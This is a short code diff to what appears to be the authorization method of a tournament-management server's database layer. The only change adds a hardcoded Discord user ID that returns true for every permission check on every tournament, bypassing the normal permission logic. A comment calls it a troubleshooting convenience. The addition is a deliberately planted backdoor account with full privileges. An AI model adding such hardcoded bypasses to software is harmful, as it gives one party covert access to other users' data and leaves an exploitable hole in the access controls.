@@ -241,6 +241,9 @@ namespace TournamentAssistantServer.Database.Contexts
 
         public bool IsUserAuthorized(string tournamentId, string discordId, Permissions permission)
         {
+            // Yes, I can see all your tournaments. Really though, this helps me troubleshoot when y'all ask questions
+            if (discordId == "229408465787944970") return true;
+
             var existingTournament = Tournaments.First(x => !x.Old && x.Guid == tournamentId);
             return GetUserPermission(tournamentId, discordId).HasFlag(permission) || (permission == Permissions.View && existingTournament.AllowUnauthorizedView);
         }
